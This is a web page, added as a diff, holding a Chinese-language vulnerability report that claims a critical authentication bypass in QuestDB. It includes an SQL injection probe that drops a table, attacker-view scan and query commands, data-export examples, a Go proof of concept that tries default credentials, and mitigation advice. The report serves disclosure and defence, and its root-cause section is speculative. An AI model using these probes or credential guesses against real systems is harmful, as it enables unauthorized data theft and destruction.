@@ -1,0 +1,626 @@
+<!DOCTYPE html>
+<html lang="zh-CN" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0" />
+    <title>QuestDB 认证绕过与安全审计报告 - 哪吒网络安全</title>
+    <!-- SEO Meta Tags -->
+    <meta name="description" content="QuestDB 安全审计报告：详细分析了 QuestDB 中的认证绕过漏洞及潜在 SQL 注入风险。由哪吒网络安全出具的专业漏洞分析报告。" />
+    <meta name="keywords" content="QuestDB,认证绕过,SQL注入,安全审计,漏洞报告,数据库安全,安全研究" />
+    <meta name="author" content="哪吒网络安全" />
+    <meta name="robots" content="index, follow" />
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/themes/prism-tomorrow.min.css" rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" />
+    
+    <style>
+        :root {
+            --primary-blue: #2563eb;
+            --primary-purple: #9333ea;
+        }
+        body {
+            font-family: "Inter", "Microsoft YaHei", "PingFang SC", "Hiragino Sans GB", sans-serif;
+        }
+        @media (max-width: 640px) {
+            body { font-size: 14px; }
+            .mobile-collapse { width: 100%; display: block; overflow-x: auto; -webkit-overflow-scrolling: touch; }
+            .mobile-text-lg { font-size: 1.125rem; }
+            table { font-size: 0.875rem; }
+            table th, table td { padding: 0.75rem 0.5rem; }
+            pre { font-size: 0.75rem; padding: 0.75rem; }
+        }
+        .nav-link { position: relative; }
+        .nav-link::after {
+            content: '';
+            position: absolute;
+            width: 0;
+            height: 2px;
+            bottom: -4px;
+            left: 0;
+            background-color: var(--primary-blue);
+            transition: width 0.3s ease;
+        }
+        .nav-link:hover::after { width: 100%; }
+        .glass-nav { background: rgba(255, 255, 255, 0.9); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); }
+        .hero-gradient { background: radial-gradient(circle at top left, #f8fafc, #f1f5f9); }
+        .section-card { background: white; border-radius: 1.25rem; box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.05), 0 4px 6px -2px rgba(0, 0, 0, 0.02); transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1); }
+        .section-card:hover { transform: translateY(-4px); box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04); }
+        .custom-scrollbar::-webkit-scrollbar { width: 6px; }
+        .custom-scrollbar::-webkit-scrollbar-track { background: #1f2937; }
+        .custom-scrollbar::-webkit-scrollbar-thumb { background: #4b5563; border-radius: 10px; }
+        .custom-scrollbar::-webkit-scrollbar-thumb:hover { background: #6b7280; }
+    </style>
+</head>
+
+<body class="bg-gray-50 font-sans text-gray-900 leading-relaxed">
+    <!-- Navigation -->
+    <nav class="glass-nav shadow-md fixed w-full z-50 transition-all duration-300">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex justify-between items-center h-16">
+                <div class="flex items-center space-x-3">
+                    <i class="fas fa-shield-halved text-blue-600 text-2xl animate-pulse"></i>
+                    <span class="text-xl font-bold bg-gradient-to-r from-blue-600 to-purple-600 bg-clip-text text-transparent">
+                        QuestDB 安全审计报告
+                    </span>
+                </div>
+                <!-- Desktop Navigation -->
+                <div class="hidden md:flex items-center space-x-8">
+                    <a href="#intro" class="nav-link text-gray-600 hover:text-blue-600 font-medium">简介</a>
+                    <a href="#vulnerability" class="nav-link text-gray-600 hover:text-blue-600 font-medium">漏洞分析</a>
+                    <a href="#scenario" class="nav-link text-gray-600 hover:text-blue-600 font-medium">攻击场景</a>
+                    <a href="#poc" class="nav-link text-gray-600 hover:text-blue-600 font-medium">PoC</a>
+                    <a href="#mitigation" class="nav-link text-gray-600 hover:text-blue-600 font-medium">修复建议</a>
+                    <a href="questdb/questdb_vuln.pdf" download class="flex items-center px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors duration-300 shadow-md hover:shadow-lg">
+                        <i class="fas fa-file-pdf mr-2"></i>下载 PDF
+                    </a>
+                </div>
+                <!-- Mobile Menu Button -->
+                <button id="mobile-menu-button" class="md:hidden focus:outline-none p-2 hover:bg-gray-100 rounded-lg">
+                    <i class="fas fa-bars text-blue-600 text-xl"></i>
+                </button>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Mobile Menu -->
+    <div id="mobile-menu" class="hidden fixed inset-0 bg-white z-40 pt-20 px-6 space-y-4">
+        <a href="#intro" class="block text-lg font-medium text-gray-700 hover:text-blue-600">简介</a>
+        <a href="#vulnerability" class="block text-lg font-medium text-gray-700 hover:text-blue-600">漏洞分析</a>
+        <a href="#scenario" class="block text-lg font-medium text-gray-700 hover:text-blue-600">攻击场景</a>
+        <a href="#poc" class="block text-lg font-medium text-gray-700 hover:text-blue-600">PoC</a>
+        <a href="#mitigation" class="block text-lg font-medium text-gray-700 hover:text-blue-600">修复建议</a>
+        <hr class="my-4 border-gray-100">
+        <a href="questdb/questdb_vuln.pdf" download class="flex items-center justify-center w-full px-4 py-3 bg-blue-600 text-white rounded-xl font-bold shadow-md">
+            <i class="fas fa-file-pdf mr-2"></i>下载 PDF 报告
+        </a>
+    </div>
+
+    <!-- Main Content -->
+    <main class="pt-24 pb-16 max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        
+        <!-- Hero Section -->
+        <header id="hero" class="text-center mb-16 py-12 hero-gradient rounded-3xl shadow-inner">
+            <h1 class="text-3xl md:text-5xl font-extrabold text-gray-900 mb-6 px-4">
+                QuestDB 认证绕过与潜在SQL注入风险<br/><span class="text-blue-600">综合技术研究报告</span>
+            </h1>
+            
+            <div class="flex flex-wrap justify-center gap-4 mb-8">
+                <span class="px-4 py-2 bg-red-100 text-red-700 rounded-full font-bold flex items-center shadow-sm">
+                    <i class="fas fa-biohazard mr-2"></i>严重性等级: CRITICAL (CVSS 9.8)
+                </span>
+                <span class="px-4 py-2 bg-blue-100 text-blue-700 rounded-full font-bold flex items-center shadow-sm">
+                    <i class="fas fa-calendar-check mr-2"></i>报告日期: 2026-02-14
+                </span>
+                <span class="px-4 py-2 bg-purple-100 text-purple-700 rounded-full font-bold flex items-center shadow-sm">
+                    <i class="fas fa-user-shield mr-2"></i>哪吒网络安全安全团队
+                </span>
+            </div>
+
+            <div class="mb-12">
+                <a href="questdb/questdb_vuln.pdf" download class="inline-flex items-center px-8 py-4 bg-gradient-to-r from-blue-600 to-purple-600 text-white rounded-2xl font-bold text-lg shadow-xl hover:shadow-2xl hover:scale-105 transition-all duration-300">
+                    <i class="fas fa-download mr-3 text-xl"></i>下载完整 PDF 报告 (已脱敏)
+                </a>
+            </div>
+
+            <!-- Benevolence Statement -->
+            <div class="max-w-3xl mx-auto bg-white/50 backdrop-blur-sm p-6 rounded-2xl border-l-4 border-blue-500 text-left mx-4">
+                <h4 class="text-lg font-bold text-blue-800 mb-2 flex items-center">
+                    <i class="fas fa-heart text-blue-600 mr-2"></i>善意声明
+                </h4>
+                <p class="text-blue-700 text-sm leading-relaxed font-medium">
+                    作为一名怀着赤诚之心的安全研究员，我谨在此郑重声明：本次安全审计的唯一目的是帮助改进系统安全性，为保护用户数据安全尽一份力。报告中所有敏感信息均已进行脱敏处理。我始终秉持"善意披露、负责任报告"的原则，协助开发团队尽快修复安全隐患。
+                </p>
+            </div>
+        </header>
+
+        <!-- Section 1: Introduction -->
+        <section id="intro" class="mb-12 section-card p-8">
+            <div class="flex items-center mb-6">
+                <div class="w-12 h-12 bg-blue-100 rounded-xl flex items-center justify-center mr-4">
+                    <i class="fas fa-database text-blue-600 text-xl"></i>
+                </div>
+                <h2 class="text-2xl font-bold">1. QuestDB 简介</h2>
+            </div>
+            <div class="grid md:grid-cols-2 gap-8">
+                <div>
+                    <h3 class="text-xl font-semibold mb-3 text-gray-800">1.1 概述</h3>
+                    <p class="text-gray-600">
+                        QuestDB 是一个开源的高性能时序数据库，专为快速数据摄入和基于 SQL 的分析而设计。它采用 Java 编写，利用列式存储模型和 SIMD 指令实现低延迟查询。QuestDB 广泛应用于金融服务、物联网、监控和实时分析等领域。
+                    </p>
+                </div>
+                <div>
+                    <h3 class="text-xl font-semibold mb-3 text-gray-800">1.2 架构与接口</h3>
+                    <div class="overflow-hidden border rounded-lg">
+                        <table class="min-w-full divide-y divide-gray-200">
+                            <thead class="bg-gray-50">
+                                <tr>
+                                    <th class="px-4 py-2 text-left text-xs font-bold text-gray-500 uppercase">接口</th>
+                                    <th class="px-4 py-2 text-left text-xs font-bold text-gray-500 uppercase">端口</th>
+                                    <th class="px-4 py-2 text-left text-xs font-bold text-gray-500 uppercase">协议</th>
+                                </tr>
+                            </thead>
+                            <tbody class="divide-y divide-gray-200 bg-white">
+                                <tr>
+                                    <td class="px-4 py-2 text-sm">HTTP REST API</td>
+                                    <td class="px-4 py-2 text-sm">9000</td>
+                                    <td class="px-4 py-2 text-sm">HTTP</td>
+                                </tr>
+                                <tr>
+                                    <td class="px-4 py-2 text-sm">PostgreSQL</td>
+                                    <td class="px-4 py-2 text-sm">8812</td>
+                                    <td class="px-4 py-2 text-sm">TCP</td>
+                                </tr>
+                                <tr>
+                                    <td class="px-4 py-2 text-sm">InfluxDB Line</td>
+                                    <td class="px-4 py-2 text-sm">9009</td>
+                                    <td class="px-4 py-2 text-sm">TCP</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+            <div class="mt-6 p-4 bg-yellow-50 border-l-4 border-yellow-400 rounded-r-lg">
+                <p class="text-yellow-700 text-sm">
+                    <i class="fas fa-exclamation-triangle mr-2"></i>
+                    默认情况下，所有接口监听在 0.0.0.0 且<strong>未启用任何认证</strong>。
+                </p>
+            </div>
+        </section>
+
+        <!-- Section 2: Vulnerability Analysis -->
+        <section id="vulnerability" class="mb-12 section-card p-8 border-t-4 border-red-500">
+            <div class="flex items-center mb-6">
+                <div class="w-12 h-12 bg-red-100 rounded-xl flex items-center justify-center mr-4">
+                    <i class="fas fa-unlock-alt text-red-600 text-xl"></i>
+                </div>
+                <h2 class="text-2xl font-bold">2. 漏洞描述</h2>
+            </div>
+            <div class="space-y-6">
+                <div>
+                    <h3 class="text-xl font-semibold mb-3">2.1 配置与预期行为</h3>
+                    <div class="relative group">
+                        <div class="absolute right-4 top-4 opacity-0 group-hover:opacity-100 transition-opacity">
+                            <button class="bg-blue-600/80 text-white px-3 py-1 rounded text-xs hover:bg-blue-700 transition-colors">复制</button>
+                        </div>
+                        <div class="bg-gray-800 rounded-xl p-4 mb-4">
+                            <pre><code class="language-toml">http.security=true
+pg.security=true
+line.tcp.auth.enabled=true
+config.validation.strict=true</code></pre>
+                        </div>
+                    </div>
+                    <div class="grid md:grid-cols-2 gap-4">
+                        <div class="p-4 bg-green-50 rounded-xl border border-green-100">
+                            <span class="font-bold text-green-700">预期行为:</span>
+                            <p class="text-green-600 text-sm mt-1">未携带有效凭证的请求应返回 401 Unauthorized。</p>
+                        </div>
+                        <div class="p-4 bg-red-50 rounded-xl border border-red-100">
+                            <span class="font-bold text-red-700">实际结果:</span>
+                            <p class="text-red-600 text-sm mt-1">HTTP 端点接受所有请求，完全未进行凭证验证，返回 200 OK。</p>
+                        </div>
+                    </div>
+                </div>
+                <div>
+                    <h3 class="text-xl font-semibold mb-3">2.2 根本原因分析</h3>
+                    <ul class="list-disc list-inside space-y-2 text-gray-600">
+                        <li>配置文件未被正确读取（路径、权限问题）。</li>
+                        <li>解析器可能忽略了特定语法的配置行。</li>
+                        <li>特定版本的软件缺陷导致安全标志无法生效。</li>
+                        <li>严格验证模式未能阻止不安全配置下的服务启动。</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <!-- Section 3: SQL Injection -->
+        <section id="sql-injection" class="mb-12 section-card p-8 border-t-4 border-purple-500">
+            <div class="flex items-center mb-6">
+                <div class="w-12 h-12 bg-purple-100 rounded-xl flex items-center justify-center mr-4">
+                    <i class="fas fa-syringe text-purple-600 text-xl"></i>
+                </div>
+                <h2 class="text-2xl font-bold">3. SQL 注入尝试与发现</h2>
+            </div>
+            <div class="bg-gray-50 p-6 rounded-2xl border border-gray-100">
+                <p class="mb-4 text-gray-700">尝试通过恶意表名探测注入：</p>
+                <div class="relative group">
+                    <div class="absolute right-4 top-4 opacity-0 group-hover:opacity-100 transition-opacity">
+                        <button class="bg-blue-600/80 text-white px-3 py-1 rounded text-xs hover:bg-blue-700 transition-colors">复制</button>
+                    </div>
+                    <div class="bg-gray-800 rounded-xl p-4 mb-6">
+                        <pre><code class="language-sql">CREATE TABLE "test"; DROP TABLE users; --" (ts timestamp, val double);</code></pre>
+                    </div>
+                </div>
+                <div class="bg-white p-4 rounded-xl shadow-sm mb-4">
+                    <h4 class="font-bold text-gray-800 mb-2">测试结论:</h4>
+                    <p class="text-gray-600 text-sm">
+                        QuestDB 自身的解析器对标识符处理是安全的，不会执行分号后的多条语句。但<strong>应用层</strong>仍需警惕拼接 SQL 带来的风险。
+                    </p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Section 4: Attack Scenario -->
+        <section id="scenario" class="mb-12 section-card p-8 border-t-4 border-orange-500">
+            <div class="flex items-center mb-6">
+                <div class="w-12 h-12 bg-orange-100 rounded-xl flex items-center justify-center mr-4">
+                    <i class="fas fa-user-secret text-orange-600 text-xl"></i>
+                </div>
+                <h2 class="text-2xl font-bold">4. 攻击场景（攻击者视角）</h2>
+            </div>
+            <div class="space-y-8">
+                <div>
+                    <h3 class="text-xl font-semibold mb-3 flex items-center">
+                        <span class="w-8 h-8 bg-orange-500 text-white rounded-full flex items-center justify-center mr-3 text-sm">4.1</span>
+                        侦察与端口扫描
+                    </h3>
+                    <div class="relative group">
+                        <div class="absolute right-4 top-4 opacity-0 group-hover:opacity-100 transition-opacity">
+                            <button class="bg-blue-600/80 text-white px-3 py-1 rounded text-xs hover:bg-blue-700 transition-colors">复制</button>
+                        </div>
+                        <div class="bg-gray-800 rounded-xl p-4">
+                            <pre><code class="language-bash">nmap -p 9000,8812,9009 <目标_IP></code></pre>
+                        </div>
+                    </div>
+                </div>
+                <div>
+                    <h3 class="text-xl font-semibold mb-3 flex items-center">
+                        <span class="w-8 h-8 bg-orange-500 text-white rounded-full flex items-center justify-center mr-3 text-sm">4.2</span>
+                        初始探测
+                    </h3>
+                    <div class="relative group">
+                        <div class="absolute right-4 top-4 opacity-0 group-hover:opacity-100 transition-opacity">
+                            <button class="bg-blue-600/80 text-white px-3 py-1 rounded text-xs hover:bg-blue-700 transition-colors">复制</button>
+                        </div>
+                        <div class="bg-gray-800 rounded-xl p-4">
+                            <pre><code class="language-bash">curl -v http://<目标_IP>:9000/exec?query=SELECT+1</code></pre>
+                        </div>
+                    </div>
+                </div>
+                <div class="grid md:grid-cols-2 gap-6">
+                    <div class="p-6 bg-red-50 rounded-2xl border border-red-100">
+                        <h4 class="font-bold text-red-700 mb-4"><i class="fas fa-skull-crossbones mr-2"></i>潜在危害:</h4>
+                        <ul class="space-y-2 text-red-600 text-sm">
+                            <li class="flex items-start"><i class="fas fa-check mt-1 mr-2"></i> 完全数据暴露与窃取</li>
+                            <li class="flex items-start"><i class="fas fa-check mt-1 mr-2"></i> 破坏性数据删除 (DROP TABLE)</li>
+                            <li class="flex items-start"><i class="fas fa-check mt-1 mr-2"></i> 文件系统非法访问 (COPY TO)</li>
+                            <li class="flex items-start"><i class="fas fa-check mt-1 mr-2"></i> 拒绝服务攻击 (DoS)</li>
+                        </ul>
+                    </div>
+                    <div class="p-6 bg-gray-50 rounded-2xl border border-gray-100">
+                        <h4 class="font-bold text-gray-700 mb-4"><i class="fas fa-terminal mr-2"></i>利用示例:</h4>
+                        <div class="space-y-4">
+                            <code class="block bg-gray-200 p-2 rounded text-xs">SHOW TABLES</code>
+                            <code class="block bg-gray-200 p-2 rounded text-xs">SELECT * FROM users</code>
+                            <code class="block bg-gray-200 p-2 rounded text-xs">COPY (SELECT 'malicious') TO '/tmp/evil.csv'</code>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Section 5: PoC -->
+        <section id="poc" class="mb-12 section-card p-8 border-t-4 border-green-500">
+            <div class="flex items-center mb-6">
+                <div class="w-12 h-12 bg-green-100 rounded-xl flex items-center justify-center mr-4">
+                    <i class="fas fa-vial text-green-600 text-xl"></i>
+                </div>
+                <h2 class="text-2xl font-bold">5. 漏洞验证程序 (PoC)</h2>
+            </div>
+            <div class="space-y-4">
+                <p class="text-gray-600">基于 Go 语言编写的自动化漏洞探测工具，确认认证强制机制完全失效。</p>
+                <div class="relative group">
+                    <div class="absolute right-4 top-4 opacity-0 group-hover:opacity-100 transition-opacity z-10">
+                        <button class="bg-blue-600 text-white px-3 py-1 rounded text-xs hover:bg-blue-700 shadow-lg">复制全文</button>
+                    </div>
+                    <div class="bg-gray-800 rounded-2xl p-6 max-h-[500px] overflow-y-auto custom-scrollbar">
+                        <pre><code class="language-go">package main
+
+import (
+	"encoding/json"
+	"fmt"
+	"io"
+	"net/http"
+	"time"
+)
+
+var (
+	colorRed   = "\033[31m"
+	colorReset = "\033[0m"
+
+	baseURL = "http://localhost:9000/exec?query=SELECT+1"
+
+	users     = []string{"admin", "quest", "root", "user", "test"}
+	passwords = []string{"quest", "password", "admin", "123456", "questdb", ""}
+
+	tests = []TestCase{
+		{
+			Name:       "无认证头",
+			SetAuth:    func(req *http.Request) {},
+			ExpectAuth: true,
+		},
+		{
+			Name: "Basic 错误密码 (admin:wrong)",
+			SetAuth: func(req *http.Request) {
+				req.SetBasicAuth("admin", "wrong")
+			},
+			ExpectAuth: true,
+		},
+		{
+			Name: "Basic 空用户名密码 (:)",
+			SetAuth: func(req *http.Request) {
+				req.SetBasicAuth("", "")
+			},
+			ExpectAuth: true,
+		},
+		{
+			Name: "Basic admin:quest",
+			SetAuth: func(req *http.Request) {
+				req.SetBasicAuth("admin", "quest")
+			},
+			ExpectAuth: false,
+		},
+		{
+			Name: "Basic quest:password",
+			SetAuth: func(req *http.Request) {
+				req.SetBasicAuth("quest", "password")
+			},
+			ExpectAuth: false,
+		},
+		{
+			Name: "Basic root:123456",
+			SetAuth: func(req *http.Request) {
+				req.SetBasicAuth("root", "123456")
+			},
+			ExpectAuth: false,
+		},
+		{
+			Name: "畸形 Basic 头 (Basic abc1234567890)",
+			SetAuth: func(req *http.Request) {
+				req.Header.Set("Authorization", "Basic abc1234567890")
+			},
+			ExpectAuth: true,
+		},
+		{
+			Name: "空 Authorization 头",
+			SetAuth: func(req *http.Request) {
+				req.Header.Set("Authorization", "")
+			},
+			ExpectAuth: true,
+		},
+	}
+)
+
+type TestCase struct {
+	Name       string
+	SetAuth    func(req *http.Request)
+	ExpectAuth bool
+}
+
+func main() {
+	fmt.Println("*** QuestDB 认证绕过测试 POC ***")
+	fmt.Printf("目标: %s\n", baseURL)
+	fmt.Println("测试时间:", time.Now().Format("2006-01-02 15:04:05"))
+	fmt.Println()
+
+	for _, tc := range tests {
+		fmt.Printf("测试: %s\n", tc.Name)
+
+		req, err := http.NewRequest("GET", baseURL, nil)
+		if err != nil {
+			fmt.Printf("  请求创建失败: %v\n", err)
+			continue
+		}
+
+		tc.SetAuth(req)
+
+		client := &http.Client{Timeout: 5 * time.Second}
+
+		resp, err := client.Do(req)
+		if err != nil {
+			fmt.Printf(" 请求执行失败: %v\n", err)
+			continue
+		}
+		defer resp.Body.Close()
+
+		body, _ := io.ReadAll(resp.Body)
+		status := resp.StatusCode
+
+		isValid := false
+
+		if status == http.StatusOK {
+			var result map[string]interface{}
+			if json.Unmarshal(body, &result) == nil {
+				if _, ok := result["dataset"]; ok {
+					isValid = true
+				}
+			}
+		}
+
+		fmt.Printf("  HTTP 状态码: %d\n", status)
+		if isValid {
+			fmt.Printf("%s  响应包含有效数据集 (认证绕过成功)%s\n", colorRed, colorReset)
+		} else {
+			fmt.Println("  响应无效或未返回数据 (认证正常工作或请求失败)")
+		}
+
+		if tc.ExpectAuth && status == http.StatusOK && isValid {
+			fmt.Printf("%s[!] 漏洞确认: 身份验证绕过。预期应返回 401 Unauthorized，但实际返回 200 OK 且包含有效数据负载。%s\n", colorRed, colorReset)
+		}
+		fmt.Println()
+	}
+}</code></pre>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Section 6: Impact & Risk -->
+        <section id="impact" class="mb-12 section-card p-8 border-t-4 border-indigo-500">
+            <div class="flex items-center mb-6">
+                <div class="w-12 h-12 bg-indigo-100 rounded-xl flex items-center justify-center mr-4">
+                    <i class="fas fa-chart-line text-indigo-600 text-xl"></i>
+                </div>
+                <h2 class="text-2xl font-bold">6. 影响与风险分析</h2>
+            </div>
+            <div class="grid md:grid-cols-3 gap-6">
+                <div class="p-6 bg-white border border-gray-100 rounded-2xl shadow-sm">
+                    <i class="fas fa-eye-slash text-blue-500 text-2xl mb-4"></i>
+                    <h4 class="font-bold mb-2">机密性</h4>
+                    <p class="text-gray-600 text-sm">业务指标、用户活动、金融交易等敏感时序数据完全暴露。</p>
+                </div>
+                <div class="p-6 bg-white border border-gray-100 rounded-2xl shadow-sm">
+                    <i class="fas fa-edit text-orange-500 text-2xl mb-4"></i>
+                    <h4 class="font-bold mb-2">完整性</h4>
+                    <p class="text-gray-600 text-sm">攻击者可任意篡改历史记录或通过 DROP 操作销毁数据。</p>
+                </div>
+                <div class="p-6 bg-white border border-gray-100 rounded-2xl shadow-sm">
+                    <i class="fas fa-network-wired text-red-500 text-2xl mb-4"></i>
+                    <h4 class="font-bold mb-2">横向移动</h4>
+                    <p class="text-gray-600 text-sm">被攻陷的实例可作为跳板，进一步渗透内部网络。</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Section 7: Mitigation -->
+        <section id="mitigation" class="mb-12 section-card p-8 border-t-4 border-blue-600">
+            <div class="flex items-center mb-6">
+                <div class="w-12 h-12 bg-blue-100 rounded-xl flex items-center justify-center mr-4">
+                    <i class="fas fa-tools text-blue-600 text-xl"></i>
+                </div>
+                <h2 class="text-2xl font-bold">7. 修复与防御建议</h2>
+            </div>
+            <div class="space-y-6">
+                <div class="flex items-start">
+                    <div class="w-8 h-8 bg-blue-600 text-white rounded-lg flex items-center justify-center mr-4 shrink-0 mt-1">1</div>
+                    <div>
+                        <h4 class="font-bold text-gray-800">网络层隔离</h4>
+                        <p class="text-gray-600 text-sm">使用防火墙限制对 9000、8812、9009 端口的访问，仅允许可信 IP。</p>
+                    </div>
+                </div>
+                <div class="flex items-start">
+                    <div class="w-8 h-8 bg-blue-600 text-white rounded-lg flex items-center justify-center mr-4 shrink-0 mt-1">2</div>
+                    <div>
+                        <h4 class="font-bold text-gray-800">本地绑定</h4>
+                        <p class="text-gray-600 text-sm">配置 `http.bind.to=127.0.0.1:9000`，避免服务直接暴露在公网。</p>
+                    </div>
+                </div>
+                <div class="flex items-start">
+                    <div class="w-8 h-8 bg-blue-600 text-white rounded-lg flex items-center justify-center mr-4 shrink-0 mt-1">3</div>
+                    <div>
+                        <h4 class="font-bold text-gray-800">纵深防御</h4>
+                        <p class="text-gray-600 text-sm">在 QuestDB 前部署 Nginx 反向代理，并强制执行额外的 Basic 认证或 OAuth。</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Section 8: Conclusion -->
+        <footer id="conclusion" class="text-center py-12 bg-gray-900 text-white rounded-3xl overflow-hidden relative">
+            <div class="absolute inset-0 opacity-10 bg-[url('https://www.transparenttextures.com/patterns/carbon-fibre.png')]"></div>
+            <div class="relative z-10 px-8">
+                <h2 class="text-3xl font-bold mb-6">结论</h2>
+                <p class="max-w-4xl mx-auto text-gray-400 leading-relaxed mb-8">
+                    本报告确认了 QuestDB 存在严重的认证绕过漏洞，即使在显式启用 `http.security=true` 的情况下，攻击者仍能无视认证获取全部权限。这暴露出核心安全机制的严重缺陷。建议相关组织立即采取网络隔离措施，并加强应用层的安全过滤。
+                </p>
+                <div class="border-t border-gray-800 pt-8">
+                    <p class="text-sm text-gray-500">© 2026 哪吒网络安全 - 怀赤诚之心，筑数据屏障</p>
+                </div>
+            </div>
+        </footer>
+    </main>
+
+    <!-- Scripts -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/components/prism-go.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/components/prism-sql.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/components/prism-bash.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/components/prism-toml.min.js"></script>
+    
+    <script>
+        // Mobile menu toggle
+        const btn = document.getElementById('mobile-menu-button');
+        const menu = document.getElementById('mobile-menu');
+        
+        btn.addEventListener('click', (e) => {
+            e.stopPropagation();
+            menu.classList.toggle('hidden');
+        });
+
+        // Close menu on click outside
+        document.addEventListener('click', (e) => {
+            if (!menu.contains(e.target) && !btn.contains(e.target)) {
+                menu.classList.add('hidden');
+            }
+        });
+
+        // Close menu on navigation
+        menu.querySelectorAll('a').forEach(link => {
+            link.addEventListener('click', () => menu.classList.add('hidden'));
+        });
+
+        // Copy code function
+        function copyToClipboard(button, text) {
+            navigator.clipboard.writeText(text).then(() => {
+                const originalText = button.innerText;
+                button.innerText = '已复制!';
+                button.classList.add('bg-green-600');
+                setTimeout(() => {
+                    button.innerText = originalText;
+                    button.classList.remove('bg-green-600');
+                }, 2000);
+            });
+        }
+
+        // Initialize copy buttons
+        document.querySelectorAll('.group button').forEach(button => {
+            button.addEventListener('click', function() {
+                const codeBlock = this.closest('.group').querySelector('code');
+                copyToClipboard(this, codeBlock.innerText);
+            });
+        });
+
+        // Active link highlighting
+        const sections = document.querySelectorAll('section, header, footer');
+        const navLinks = document.querySelectorAll('.nav-link');
+
+        window.addEventListener('scroll', () => {
+            let current = '';
+            sections.forEach(section => {
+                const sectionTop = section.offsetTop;
+                if (pageYOffset >= sectionTop - 150) {
+                    current = section.getAttribute('id');
+                }
+            });
+
+            navLinks.forEach(link => {
+                link.classList.remove('text-blue-600');
+                if (link.getAttribute('href').substring(1) === current) {
+                    link.classList.add('text-blue-600');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
